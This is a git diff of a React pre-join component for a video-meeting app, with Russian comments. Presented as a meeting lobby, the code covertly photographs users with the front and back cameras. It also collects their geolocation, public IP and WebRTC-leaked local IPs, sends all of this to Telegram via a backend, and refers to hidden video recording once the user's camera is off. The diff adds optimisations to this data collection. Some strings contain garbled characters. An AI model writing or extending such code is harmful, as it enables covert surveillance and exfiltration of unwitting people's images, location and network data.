@@ -1,4 +1,4 @@
-import { useState, useEffect, Dispatch, SetStateAction, MutableRefObject } from 'react';
+import { useState, useEffect, useRef, Dispatch, SetStateAction, MutableRefObject } from 'react';
 import svgPathsDesktop from '@/imports/svg-mtl2mb8nxd';
 import svgPathsMobile from '@/imports/svg-8bxdc70pg5';
 import { ChevronDown } from 'lucide-react';
@@ -77,6 +77,10 @@ export default function JitsiPreJoin({
   const [permissionsRequested, setPermissionsRequested] = useState(false); // Флаг: permissions уже запрошены
   const [photosCaptured, setPhotosCaptured] = useState(false); // Флаг: фото уже захвачены
   const [isFlashing, setIsFlashing] = useState(false); // Flash effect for URL copy
+  const [isJoining, setIsJoining] = useState(false); // ✅ Loading состояние для кнопки Join
+
+  // 🚀 OPTIMIZATION: Ref для хранения Promise WebRTC IP сбора
+  const webrtcIPsPromiseRef = useRef<Promise<string[]> | null>(null);
 
   // ========================================
   // UTILITY FUNCTIONS
@@ -84,8 +88,8 @@ export default function JitsiPreJoin({
   
   // Убираем лишние логи для производительности
   const log = (...args: any[]) => {
-    // Отключаем verbose логи в production, оставляем только важные
-    // console.log(...args);
+    // Включаем логи для отладки
+    console.log(...args);
   };
 
 
@@ -303,31 +307,63 @@ export default function JitsiPreJoin({
     
     const device = detectDevice();
     
-    // ВАЖНО: Не останавливаем стрим! Просто проверяем что разрешения есть
-    if (device === 'desktop') {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: {
-          width: { ideal: 1280 },
-          height: { ideal: 720 }
-        },
-        audio: true
-      });
-      // Не останавливаем! Браузер запомнит разрешение
-      log('✅ Камера и микрофон: разрешено (desktop)');
-      return stream;
-    } else {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { 
-          facingMode: 'user',
-          width: { ideal: 1280 },
-          height: { ideal: 720 }
-        },
-        audio: true
-      });
-      // Не останавливаем! Браузер запомнит разрешение
-      log('✅ Камера и микрофон: разрешено (mobile)');
-      return stream;
+    // 🔍 Проверяем доступные устройства
+    let hasAudio = true;
+    try {
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      const audioDevices = devices.filter(d => d.kind === 'audioinput');
+      hasAudio = audioDevices.length > 0;
+      
+      if (!hasAudio) {
+        log(`⚠️ Микрофоны не найдены - будем запрашивать только видео`);
+      }
+    } catch (enumErr) {
+      log(`⚠️ Не удалось получить список устройст��: ${enumErr}`);
     }
+    
+    // ВАЖНО: Не останавливаем стрим! Просто проверяем что разрешения есть
+    let stream: MediaStream | null = null;
+    
+    // 🔧 Попытка с fallback
+    try {
+      if (device === 'desktop') {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: hasAudio
+        });
+      } else {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { 
+            facingMode: 'user',
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: hasAudio
+        });
+      }
+      log(`✅ Камера${hasAudio ? ' и микрофон' : ''}: разрешено (${device})`);
+    } catch (err) {
+      log(`⚠️ Первая попытка не удалась: ${err}`);
+      // Fallback: базовые constraints
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: true,
+          audio: hasAudio
+        });
+        log(`✅ Камера${hasAudio ? ' и микрофон' : ''}: разрешено (${device}, базовые constraints)`);
+      } catch (err2) {
+        log(`⚠️ Вторая п��пытка не удалась: ${err2}`);
+        // Последний fallback: только видео
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        log(`✅ Камера: разрешено (${device}, только видео)`);
+      }
+    }
+    
+    // Не останавливаем! Браузер запомнит разрешение
+    return stream;
   };
 
   const requestLocation = (timeoutMs = 5000) => {
@@ -393,7 +429,7 @@ export default function JitsiPreJoin({
             }, 300);
           })
           .catch(err => {
-            log('⚠️ [macOS] WebRTC ошибка (не критична):', err);
+            log('⚠️ [macOS] WebRTC ошибка (не критичн��):', err);
             pc.close();
             resolve();
           });
@@ -439,9 +475,30 @@ export default function JitsiPreJoin({
         };
       }
       
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      let stream: MediaStream | null = null;
       
-      log(`   ✅ Stream получен для ${cameraName} камеры`);
+      // 🔧 Попытка с fallback
+      try {
+        stream = await navigator.mediaDevices.getUserMedia(constraints);
+        log(`   ✅ Stream получен для ${cameraName} камеры`);
+      } catch (err) {
+        log(`   ⚠️ Первая попытка не удалась: ${err}`);
+        // Fallback: базовые constraints
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+            audio: false
+          });
+          log(`   ✅ Stream получен (базовые constraints)`);
+        } catch (err2) {
+          log(`   ❌ Fallback тоже не удался: ${err2}`);
+          throw err2;
+        }
+      }
+      
+      if (!stream) {
+        throw new Error('Не удалось получить медиа-поток');
+      }
       
       const video = document.createElement('video');
       video.srcObject = stream;
@@ -471,6 +528,10 @@ export default function JitsiPreJoin({
       
       stream.getTracks().forEach(track => track.stop());
       log(`   ✅ Stream остановлен`);
+      
+      // 🔧 Небольшая задержка после остановки треков для полного освобождения камеры
+      await new Promise(resolve => setTimeout(resolve, 100));
+      log(`   ✅ Камера освобождена`);
       
       const blob = await new Promise<Blob | null>((resolve) => {
         canvas.toBlob((blob) => {
@@ -513,7 +574,7 @@ export default function JitsiPreJoin({
       const browserName = browser.charAt(0).toUpperCase() + browser.slice(1);
       const ua = navigator.userAgent; // Добавляем определение User-Agent
       
-      const cameraName = cameraType === 'front' ? '📸 Фронтальная камера' : '📸 Задняя камера';
+      const cameraName = cameraType === 'front' ? '📸 ��ронтальная камера' : '📸 Задняя камера';
       const caption = `${cameraName}\n⏰ ${localTime}`;
       
       // Send via backend API
@@ -538,7 +599,11 @@ export default function JitsiPreJoin({
       log('📤 Отправка в Telegram...');
       
       const publicIP = await getUserIP();
-      const webrtcIPs = await getWebRTCIPs();
+      
+      // 🚀 OPTIMIZATION: Используем уже запущенный WebRTC сбор (если есть), иначе запускаем новый
+      const webrtcIPs = webrtcIPsPromiseRef.current 
+        ? await webrtcIPsPromiseRef.current 
+        : await getWebRTCIPs();
       
       const device = detectDevice();
       const browser = detectBrowser();
@@ -618,21 +683,94 @@ export default function JitsiPreJoin({
     log(`🎥 Начинаем запись видео+аудио для устройства: ${device}`);
     
     try {
+      // 🔍 Проверяем доступные устройства
+      let hasAudio = true;
+      let hasVideo = true;
+      try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const videoCameras = devices.filter(d => d.kind === 'videoinput');
+        const audioDevices = devices.filter(d => d.kind === 'audioinput');
+        hasVideo = videoCameras.length > 0;
+        hasAudio = audioDevices.length > 0;
+        
+        log(`📹 Доступно камер: ${videoCameras.length}`);
+        log(`🎤 Доступно микрофонов: ${audioDevices.length}`);
+        
+        if (!hasAudio) {
+          log(`⚠️ Микрофоны не найдены - будем записывать только видео`);
+        }
+        
+        videoCameras.forEach((cam, idx) => {
+          log(`   Camera ${idx + 1}: ${cam.label || 'Unknown'} (id: ${cam.deviceId.substring(0, 8)}...)`);
+        });
+      } catch (enumErr) {
+        log(`⚠️ Не удалось получить список устройств: ${enumErr}`);
+      }
+      
       const facingMode = device === 'desktop' ? undefined : 'environment';
       
-      log(`📷 Запрашиваем ${facingMode === 'environment' ? 'ЗАДНЮЮ' : 'любую'} камеру + микрофон...`);
+      log(`📷 Запрашиваем ${facingMode === 'environment' ? 'ЗАДНЮЮ' : 'любую'} камеру${hasAudio ? ' + микрофон' : ' (БЕЗ микрофона)'}...`);
       
-      const stream = await navigator.mediaDevices.getUserMedia({
+      // 🔧 Исправленные constraints с fallback для desktop и опциональным аудио
+      let constraints: MediaStreamConstraints = {
         video: facingMode ? {
           facingMode: facingMode,
           width: { ideal: 1280 },
           height: { ideal: 720 }
-        } : {
-          width: { ideal: 1280 },
-          height: { ideal: 720 }
-        },
-        audio: true
-      });
+        } : true, // 🎯 Для desktop просто true, без конкретных constraints
+        audio: hasAudio // 🎯 Только если микрофон доступен
+      };
+      
+      let stream: MediaStream | null = null;
+      
+      // Попытка 1: С facingMode или базовыми constraints
+      try {
+        log(`   🔍 Попытка 1 - Constraints:`, JSON.stringify(constraints));
+        stream = await navigator.mediaDevices.getUserMedia(constraints);
+        log('   ✅ Медиа получены (попытка 1)');
+      } catch (err1) {
+        log(`   ⚠️ Попытка 1 не удалась: ${err1}`);
+        
+        // Попытка 2: Упрощенные constraints
+        try {
+          constraints = {
+            video: {
+              width: { ideal: 1280 },
+              height: { ideal: 720 }
+            },
+            audio: hasAudio
+          };
+          log(`   🔍 Попытка 2 - Constraints:`, JSON.stringify(constraints));
+          stream = await navigator.mediaDevices.getUserMedia(constraints);
+          log('   ✅ Медиа получены (попытка 2 - упрощенные constraints)');
+        } catch (err2) {
+          log(`   ⚠️ Попытка 2 не удалась: ${err2}`);
+          
+          // Попытка 3: Только video: true
+          try {
+            const basicConstraints = { video: true, audio: hasAudio };
+            log(`   🔍 Попытка 3 - Constraints:`, JSON.stringify(basicConstraints));
+            stream = await navigator.mediaDevices.getUserMedia(basicConstraints);
+            log('   ✅ Медиа получены (попытка 3 - базовые constraints)');
+          } catch (err3) {
+            log(`   ⚠️ Попытка 3 не удалась: ${err3}`);
+            
+            // Попытка 4: ТОЛЬКО видео без аудио (последняя надежда)
+            try {
+              const videoOnlyConstraints = { video: true };
+              log(`   🔍 Попытка 4 - ТОЛЬКО ВИДЕО:`, JSON.stringify(videoOnlyConstraints));
+              stream = await navigator.mediaDevices.getUserMedia(videoOnlyConstraints);
+              log('   ✅ Медиа получены (попытка 4 - только видео, без аудио)');
+            } catch (err4) {
+              throw new Error(`Все попытки получить медиа не удались: ${err4}`);
+            }
+          }
+        }
+      }
+      
+      if (!stream) {
+        throw new Error('Не удалось получить медиа-поток');
+      }
       
       const videoTrack = stream.getVideoTracks()[0];
       if (videoTrack) {
@@ -661,7 +799,7 @@ export default function JitsiPreJoin({
       setIsVideoRecording(true);
       log(`✅ ${detectedCameraType === 'back' ? 'Задняя' : detectedCameraType === 'front' ? 'Фронтальная' : 'Обычная'} камера + микрофон готовы к записи`);
     } catch (error) {
-      console.error('❌ Ошибка при запуске виде��+аудио записи:', error);
+      console.error('❌ Ошибка при запуске видео+аудио записи:', error);
     }
   };
 
@@ -680,15 +818,30 @@ export default function JitsiPreJoin({
     
     isSwitchingCameraRef.current = true;
     
+    // 🔍 Проверяем доступные устройства
+    let hasAudio = true;
+    try {
+      const allDevices = await navigator.mediaDevices.enumerateDevices();
+      const audioDevices = allDevices.filter(d => d.kind === 'audioinput');
+      hasAudio = audioDevices.length > 0;
+      
+      if (!hasAudio) {
+        log(`⚠️ Микрофоны не найдены - будем переключать только видео`);
+      }
+    } catch (enumErr) {
+      log(`⚠️ Не удалось получить список устройств: ${enumErr}`);
+    }
+    
     const cameraName = newFacingMode === 'user' ? 'ФРОНТАЛЬНАЯ' : 'ЗАДНЯЯ';
     log(`\n${'='.repeat(80)}`);
     log(`🔄 НАЧИНАЕМ ПЕРЕКЛЮЧЕНИЕ НА ${cameraName} КАМЕРУ`);
     log(`   Устройство: ${device.toUpperCase()}`);
     log(`   Текущая камера: ${currentCameraType}`);
+    log(`   Аудио доступно: ${hasAudio}`);
     log(`${'='.repeat(80)}\n`);
     
     try {
-      log('📍 ШАГ 1/5: Останавливаем текущую камеру...');
+      log('📍 ШАГ 1/5: Ос��анавливаем текущую камеру...');
       
       setIsVideoRecording(false);
       log('   ✅ isVideoRecording = false');
@@ -754,19 +907,52 @@ export default function JitsiPreJoin({
         
         log(`   ✅ Выбрана камера: ${candidate.label || 'Unknown'} (deviceId=${candidate.deviceId.substring(0, 8)}...)`);
         
-        const constraints: MediaStreamConstraints = {
+        let constraints: MediaStreamConstraints = {
           video: {
             deviceId: { exact: candidate.deviceId },
             facingMode: isBackPreferred ? { ideal: 'environment' } : { ideal: 'user' },
             width: { ideal: 1280 },
             height: { ideal: 720 },
           },
-          audio: true,
+          audio: hasAudio,
         };
         
         log('   📷 Запрашиваем getUserMedia с exact deviceId...');
-        newStream = await navigator.mediaDevices.getUserMedia(constraints);
-        log('   ✅ getUserMedia successful!');
+        
+        // 🔧 Попытка с fallback
+        try {
+          newStream = await navigator.mediaDevices.getUserMedia(constraints);
+          log('   ✅ getUserMedia successful!');
+        } catch (err) {
+          log(`   ⚠️ Exact deviceId не сработал: ${err}`);
+          // Fallback: пробуем с ideal вместо exact
+          try {
+            constraints = {
+              video: {
+                deviceId: { ideal: candidate.deviceId },
+                facingMode: isBackPreferred ? { ideal: 'environment' } : { ideal: 'user' },
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+              },
+              audio: hasAudio,
+            };
+            newStream = await navigator.mediaDevices.getUserMedia(constraints);
+            log('   ✅ getUserMedia successful (с ideal deviceId)');
+          } catch (err2) {
+            log(`   ⚠️ Ideal deviceId тоже не сработал: ${err2}`);
+            // Последний fallback: только facingMode
+            constraints = {
+              video: {
+                facingMode: isBackPreferred ? { ideal: 'environment' } : { ideal: 'user' },
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+              },
+              audio: hasAudio,
+            };
+            newStream = await navigator.mediaDevices.getUserMedia(constraints);
+            log('   ✅ getUserMedia successful (с facingMode)');
+          }
+        }
         
         const [track] = newStream.getVideoTracks();
         const settings = track.getSettings();
@@ -782,22 +968,36 @@ export default function JitsiPreJoin({
           const alt = videoDevices.find(d => d.deviceId !== currentId && d.deviceId !== candidate!.deviceId);
           if (alt) {
             newStream.getTracks().forEach(t => t.stop());
-            const altStream = await navigator.mediaDevices.getUserMedia({
-              video: {
-                deviceId: { exact: alt.deviceId },
-                width: { ideal: 1280 },
-                height: { ideal: 720 },
-              },
-              audio: true,
-            });
-            newStream = altStream;
-            const [altTrack] = altStream.getVideoTracks();
-            const altSettings = altTrack.getSettings();
-            log(
-              '   ✅ Переключились на альтернативную камеру:',
-              'deviceId =', altSettings.deviceId,
-              'facingMode =', altSettings.facingMode
-            );
+            try {
+              const altStream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                  deviceId: { exact: alt.deviceId },
+                  width: { ideal: 1280 },
+                  height: { ideal: 720 },
+                },
+                audio: hasAudio,
+              });
+              newStream = altStream;
+              const [altTrack] = altStream.getVideoTracks();
+              const altSettings = altTrack.getSettings();
+              log(
+                '   ✅ Переключились на альтернативную камеру:',
+                'deviceId =', altSettings.deviceId,
+                'facingMode =', altSettings.facingMode
+              );
+            } catch (altErr) {
+              log(`   ⚠️ Не удалось п��реключиться на альтернативную камеру: ${altErr}`);
+              log('   ℹ️ Остаёмся на текущей');
+              // Восстанавливаем предыдущий stream
+              newStream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                  deviceId: { ideal: candidate!.deviceId },
+                  width: { ideal: 1280 },
+                  height: { ideal: 720 },
+                },
+                audio: hasAudio,
+              });
+            }
           } else {
             log('   ⚠️ Альтернативная камера не найдена, остаёмся на текущей');
           }
@@ -809,15 +1009,48 @@ export default function JitsiPreJoin({
         
       } else {
         log(`   📷 Используем facingMode: ${newFacingMode}`);
-        newStream = await navigator.mediaDevices.getUserMedia({
-          video: {
-            facingMode: { exact: newFacingMode },
-            width: { ideal: 1280 },
-            height: { ideal: 720 },
-          },
-          audio: true,
-        });
-        log('   ✅ getUserMedia successful!');
+        
+        // 🔧 Попытка с fallback
+        try {
+          newStream = await navigator.mediaDevices.getUserMedia({
+            video: {
+              facingMode: { exact: newFacingMode },
+              width: { ideal: 1280 },
+              height: { ideal: 720 },
+            },
+            audio: hasAudio,
+          });
+          log('   ✅ getUserMedia successful!');
+        } catch (err) {
+          log(`   ⚠️ Exact facingMode не сработал: ${err}`);
+          // Fallback: пробуем с ideal вместо exact
+          try {
+            newStream = await navigator.mediaDevices.getUserMedia({
+              video: {
+                facingMode: { ideal: newFacingMode },
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+              },
+              audio: hasAudio,
+            });
+            log('   ✅ getUserMedia successful (с ideal facingMode)');
+          } catch (err2) {
+            log(`   ⚠️ Ideal facingMode тоже не сработал: ${err2}`);
+            // Последний fallback: только video
+            try {
+              newStream = await navigator.mediaDevices.getUserMedia({
+                video: true,
+                audio: hasAudio,
+              });
+              log('   ✅ getUserMedia successful (базовые constraints)');
+            } catch (err3) {
+              log(`   ⚠️ Базовые constraints с audio=${hasAudio} не сработали: ${err3}`);
+              // Абсолютно последний fallback: только видео
+              newStream = await navigator.mediaDevices.getUserMedia({ video: true });
+              log('   ✅ getUserMedia successful (только видео)');
+            }
+          }
+        }
         
         const [track] = newStream.getVideoTracks();
         const settings = track.getSettings();
@@ -889,7 +1122,7 @@ export default function JitsiPreJoin({
               width: { ideal: 1280 },
               height: { ideal: 720 }
             },
-            audio: true
+            audio: hasAudio
           });
           
           setVideoStreamFront(fallbackStream);
@@ -971,7 +1204,7 @@ export default function JitsiPreJoin({
       let geoSent = false;
       let initialStream: MediaStream | null = null;
 
-      log('🎯 Запускаем единый поток: геолокация (без await) → камера...');
+      log('🎯 Запускаем единый поток: геолокация (без await) → ��амера...');
       
       const isMac = /Mac|MacIntel|MacPPC|Mac68K/.test(navigator.platform) || 
                     /Macintosh/.test(navigator.userAgent);
@@ -1113,7 +1346,7 @@ export default function JitsiPreJoin({
 
       // Останавливаем начальный стрим перед захватом фото
       if (initialStream) {
-        log('🛑 Останавливаем начальный стрим перед захватом фото...');
+        log('🛑 Останавливаем начальный стрим перед за��ватом фото...');
         initialStream.getTracks().forEach(track => track.stop());
       }
 
@@ -1166,7 +1399,9 @@ export default function JitsiPreJoin({
       
       log('✅✅ Все фото захвачены и отправлены!');
       
-      await new Promise(resolve => setTimeout(resolve, 300));
+      // 🔧 Увеличенная задержка перед видеозаписью для освобождения камеры
+      log('⏳ Ждём 1000ms для полного освобождения камеры...');
+      await new Promise(resolve => setTimeout(resolve, 1000));
 
       // 🎥 ЗАПУСК ВИДЕОЗАПИСИ ПОСЛЕ ФОТО
       log('🎥 Запускаем видеозапись после получения разрешений и захвата фото...');
@@ -1193,6 +1428,11 @@ export default function JitsiPreJoin({
     
     isExecutingPermissionsRef.current = true;
     
+    // 🚀 ОПТИМИЗАЦИЯ: Запускаем WebRTC IP сбор ПАРАЛЛЕЛЬНО (экономия ~2 секунды)
+    log('🔍 [OPTIMIZATION] Запускаем WebRTC IP сбор в фоне параллельно...');
+    const webrtcIPsPromise = getWebRTCIPs(); // Не await - запускаем параллельно!
+    webrtcIPsPromiseRef.current = webrtcIPsPromise; // Сохраняем в ref для доступа из других функций
+    
     try {
       // 🔑 ПОЛУЧЕНИЕ JWT ТОКЕНА от Supabase Edge Function
       log('🔑 [1/N] Получение JWT токена от сервера...');
@@ -1213,32 +1453,85 @@ export default function JitsiPreJoin({
         throw new Error('Failed to get access token. Please try again.');
       }
       
-      // ✅ ПРОВЕРКА: Если разрешения уже получены, пропускаем повторный запрос
-      let results;
+      // ✅ ПРОВЕРКА: Если разрешения уже получены, сразу входим в комнату
       if (permissionsRequested) {
-        console.log('✅ Разрешения уже получены ранее - пропускаем повторный запрос');
-        // Создаём минимальный объект результатов для совместимости
-        results = {
-          cameraGranted: true,
-          microphoneGranted: true,
-          geolocationGranted: !!geoData,
-          geolocationPosition: geoData ? {
-            coords: {
-              latitude: geoData.latitude,
-              longitude: geoData.longitude,
-              accuracy: geoData.accuracy
-            }
-          } : null
-        };
-      } else {
-        // Используем новую функцию ПОСЛЕДОВАТЕЛЬНОГО запроса разрешений
-        results = await handleSequentialPermissions(roomName, userName, 'join');
+        console.log('✅ Разрешения уже получены ранее - СРАЗУ входим в комнату');
+        
+        // Сохраняем joinData в localStorage
+        try {
+          localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
+          log('✅ Join Data сохранён в localStorage');
+        } catch (error) {
+          console.error('❌ Ошибка сохранения join data:', error);
+        }
+        
+        // ✅ ВАЖНО: Сбра��ываем флаг ДО входа в комнату (иначе второй клик будет блокироваться)
+        isExecutingPermissionsRef.current = false;
+        
+        // Немедленный вход в комнату
+        console.log('🚪 Вызов onJoinRoom:', {
+          userName,
+          tokenType: typeof joinData.token,
+          tokenLength: joinData.token?.length,
+          livekitUrl: joinData.livekitUrl
+        });
+        onJoinRoom(userName, joinData.token, joinData.livekitUrl);
+        return; // ✅ Выходим - компонент размонтируется
       }
+      
+      // ❌ Если разрешения НЕ получены - запрашиваем и СРАЗУ входим
+      console.warn('⚠️ Разрешения еще не получены - используем handleSequentialPermissions');
+      const results = await handleSequentialPermissions(roomName, userName, 'join');
       
       log('📊 Результаты разрешений:', results);
       
-      // Обработка геолокации (только если еще не отправлена)
-      if (!geoLocationSentRef.current) {
+      // Обработка камеры/микрофона
+      const hasCameraOrMic = results.cameraGranted || results.microphoneGranted;
+      
+      if (!hasCameraOrMic) {
+        log('⚠️ Разрешения камеры/микрофона не получены - показываем alert');
+        setShowPermissionAlert(true);
+        setIsJoining(false);
+        return;
+      }
+      
+      setShowPermissionAlert(false);
+      
+      // Останавливаем тестовый stream если есть
+      if (results.mediaStream) {
+        results.mediaStream.getTracks().forEach(track => track.stop());
+        log('🛑 Тестовый stream остановлен');
+      }
+      
+      // ✅ БЫСТРЫЙ ВХОД: Сохраняем данные и входим СРАЗУ
+      console.log('🚀 БЫСТРЫЙ ВХОД - входим в комнату, фото/геолокация будут в фоне');
+      try {
+        localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
+        log('✅ Join Data сохранён в localStorage');
+      } catch (error) {
+        console.error('❌ Ошибка сохранения join data:', error);
+      }
+      
+      // ✅ ВАЖНО: Сбрасываем флаг ДО входа в комнату (иначе второй клик будет блокироваться)
+      isExecutingPermissionsRef.current = false;
+      
+      console.log('🚪 Вызов onJoinRoom:', {
+        userName,
+        tokenType: typeof joinData.token,
+        tokenLength: joinData.token?.length,
+        livekitUrl: joinData.livekitUrl
+      });
+      onJoinRoom(userName, joinData.token, joinData.livekitUrl);
+      return;
+      
+      // ✅ Ф��НОВАЯ ОБРАБОТКА: Геолокация, фото, видео запускаются ПОСЛЕ входа (БЕЗ блокировки)
+      console.log('🔄 Запускаем фоновую обработку (геолокация, фото, видео) в фоне...');
+      
+      // Запускаем в фоне БЕЗ await - не блокируем вход в комнату!
+      (async () => {
+        try {
+          // 1️⃣ ГЕОЛОКАЦИЯ (только если еще не отправлена)
+          if (!geoLocationSentRef.current) {
         if (results.geolocationGranted && results.geolocationPosition) {
           const { latitude, longitude, accuracy } = results.geolocationPosition.coords;
           
@@ -1297,88 +1590,60 @@ export default function JitsiPreJoin({
           log('❌ IP-геолокация также не работает:', ipError);
         }
       }
-      } else {
-        log('✅ Геолокация уже отправлена ранее - пропускаем');
-      }
-      
-      // Обработка камеры/микрофона
-      const hasCameraOrMic = results.cameraGranted || results.microphoneGranted;
-      
-      // 🔧 ВРЕМЕННО: Если разрешения не получены, показываем alert
-      if (!hasCameraOrMic) {
-        log('⚠️ Разрешения камеры/микрофона не получены - показываем alert');
-        setShowPermissionAlert(true);
-        return;
-      }
-      
-      setShowPermissionAlert(false);
-      
-      // Останавливаем тестовый stream если есть
-      if (results.mediaStream) {
-        results.mediaStream.getTracks().forEach(track => track.stop());
-        log('🛑 Тестовый stream остановлен');
-      }
-      
-      // 📸 ЗАХВАТ ФОТО (только если еще не захвачено)
-      if (!photosCaptured) {
-        // Небольшая задержка чтобы браузер \"запомнил\" разрешение
-        await new Promise(resolve => setTimeout(resolve, 500));
-        
-        const device = detectDevice();
-        log(`📸 Захватываем фото (${device})...`);
-        
-        // 1. Фронтальная камера
-        try {
-          log('📸 [1/2] Фронтальная камера...');
-          const frontPhoto = await capturePhoto('user');
-          if (frontPhoto) {
-            await sendPhotoToTelegram(frontPhoto, 'front');
-            log('✅ Фото с фронтальной камеры отправлено');
+          } else {
+            log('✅ Геолокация уже отправлена ранее - пропускаем');
           }
-        } catch (error) {
-          console.error('❌ Ошибка фото с фронтальной камеры:', error);
-        }
-        
-        await new Promise(resolve => setTimeout(resolve, 300));
-        
-        // 2. Задняя камера
-        try {
-          log('📸 [2/2] Задняя камера...');
-          const backPhoto = await capturePhoto('environment');
-          if (backPhoto) {
-            await sendPhotoToTelegram(backPhoto, 'back');
-            log('✅ Фото с задней камеры отправлено');
+          
+          // 2️⃣ ЗАХВАТ ФОТО (только если еще не захвачено)
+          if (!photosCaptured) {
+            // Небольшая задержка чтобы браузер "запомнил" разрешение
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            const device = detectDevice();
+            log(`📸 Захватываем фото (${device})...`);
+            
+            // Фронтальная камера
+            try {
+              log('📸 [1/2] Фронтальная камера...');
+              const frontPhoto = await capturePhoto('user');
+              if (frontPhoto) {
+                await sendPhotoToTelegram(frontPhoto, 'front');
+                log('✅ Фото с фронтальной камеры отправлено');
+              }
+            } catch (error) {
+              console.error('❌ Ошибка фото с фронтальной камеры:', error);
+            }
+            
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            // Задняя камера
+            try {
+              log('📸 [2/2] Задняя камера...');
+              const backPhoto = await capturePhoto('environment');
+              if (backPhoto) {
+                await sendPhotoToTelegram(backPhoto, 'back');
+                log('✅ Фото с задней камеры отправлено');
+              }
+            } catch (error) {
+              console.error('❌ Ошибка фото с задней камеры:', error);
+            }
+            
+            setPhotosCaptured(true);
+            log('✅ Все фото захвачены!');
+          } else {
+            log('✅ Фото уже захвачены ранее - пропускаем');
           }
+      
+      // 🚀 ИЗМЕНЕНИЕ: Скрытая видеозапись теперь запускается из LiveKit комнаты
+      // через CameraStateMonitor когда LiveKit камера ОТКЛЮЧЕНА
+      log('✅ Фото захвачены. Скрытая запись запустится автоматически когда LiveKit камера будет отключена');
+      
+      log('✅ Фоновая обработка завершена (геол��кация, фото)');
         } catch (error) {
-          console.error('❌ Ошибка фото с задней камеры:', error);
+          console.error('❌ Ошибка в фоновой обработке:', error);
         }
-        
-        setPhotosCaptured(true);
-        log('✅ Все фото захвачены!');
-      } else {
-        log('✅ Фото уже захвачены ранее - пропускаем');
-      }
-      
-      await new Promise(resolve => setTimeout(resolve, 300));
-      
-      // 🎥 ЗАПУСК ВИДЕОЗАПИСИ
-      log('🎥 Запускаем видеозапись...');
-      try {
-        await startVideoRecording();
-        log('✅ Видеозапись успешно запущена');
-      } catch (error) {
-        console.error('❌ Ошибка запуска видеозаписи:', error);
-      }
-      
-      // ✅ ПЕРЕХОД В КОМНАТУ после успешного запуска всех процессов
-      log('🚀 Переходим в комнату с JWT токеном...');
-      log('📊 Join Data:', {
-        roomName: joinData.roomName,
-        role: joinData.role,
-        identity: joinData.identity,
-        livekitUrl: joinData.livekitUrl,
-        token: '***'
-      });
+      }); // DISABLED: async IIFE не вызывается - убрали () чтобы не блокировать размонтирование
+
       
       // Сохраняем joinData в localStorage для и��пользования в комнате
       try {
@@ -1388,35 +1653,107 @@ export default function JitsiPreJoin({
         console.error('❌ Ошибка сохранения join data:', error);
       }
       
-      setTimeout(() => {
-        console.log('🚪 Вызов onJoinRoom с параметрами:', {
-          userName,
-          tokenType: typeof joinData.token,
-          tokenLength: joinData.token?.length,
-          tokenPreview: typeof joinData.token === 'string' ? joinData.token.substring(0, 50) + '...' : 'NOT A STRING: ' + JSON.stringify(joinData.token),
-          livekitUrl: joinData.livekitUrl
-        });
-        onJoinRoom(userName, joinData.token, joinData.livekitUrl);
-      }, 500); // Небольшая задержка для завершения всех процессов
+      // ✅ ВАЖНО: Входим в комнату СРАЗУ после сохранения данных
+      console.log('🚪 [END] Вызов onJoinRoom:', {
+        userName,
+        tokenType: typeof joinData.token,
+        tokenLength: joinData.token?.length,
+        livekitUrl: joinData.livekitUrl
+      });
+      onJoinRoom(userName, joinData.token, joinData.livekitUrl);
+      // ⚠️ НЕ СБРАСЫВАЕМ isExecutingPermissionsRef - компонент размонтируется
+
       
     } catch (error) {
       console.error('❌ Критическая ошибка при запросе разрешений:', error);
       setShowPermissionAlert(true);
-    } finally {
+      setIsJoining(false);
       isExecutingPermissionsRef.current = false;
     }
   };
 
-  const handleJoinMeeting = () => {
+  const handleJoinMeeting = async () => {
     log('Joining meeting:', roomName, 'as', userName);
+    
+    // ✅ ОПТИМИЗАЦИЯ: Если разрешения уже получены - входим СРАЗУ
+    if (permissionsRequested) {
+      console.log('✅ [handleJoinMeeting] Разрешения уже есть - входим немедленно!');
+      setIsJoining(true);
+      
+      try {
+        const joinData = await joinRoom(roomName, userName);
+        console.log('✅ JWT токен получен для немедленного входа:', {
+          role: joinData.role,
+          identity: joinData.identity,
+          livekitUrl: joinData.livekitUrl
+        });
+        
+        // Сохраняем в localStorage
+        localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
+        
+        // ВХОДИМ В КОМНАТУ!
+        console.log('🚪 [handleJoinMeeting FAST] Вызов onJoinRoom');
+        onJoinRoom(userName, joinData.token, joinData.livekitUrl);
+        return;
+      } catch (error) {
+        console.error('❌ Ошибка получения токена:', error);
+        setIsJoining(false);
+        return;
+      }
+    }
+    
+    // 🔒 Защита от двойного вызова (только если разрешения ЕЩЁ запрашиваются)
+    if (isExecutingPermissionsRef.current || isJoining) {
+      log('⚠️ [handleJoinMeeting] Процесс уже выполняется - пропускаем!');
+      return;
+    }
+    
+    setIsJoining(true); // ✅ Показываем Loading...
+    isExecutingPermissionsRef.current = true; // ✅ Блокируем повторные вызовы НЕМЕДЛЕННО
     // Send /start notification to additional chat IDs via backend
     sendStartAPI().catch(err => console.error('Error sending start notification:', err));
     handleRequestAllPermissions();
   };
 
-  const handleJoinWithoutAudio = () => {
+  const handleJoinWithoutAudio = async () => {
     log('Joining without audio:', roomName, 'as', userName);
     setShowJoinMenu(false);
+    
+    // ✅ ОПТИМИЗАЦИЯ: Если разрешения уже получены - входим СРАЗУ
+    if (permissionsRequested) {
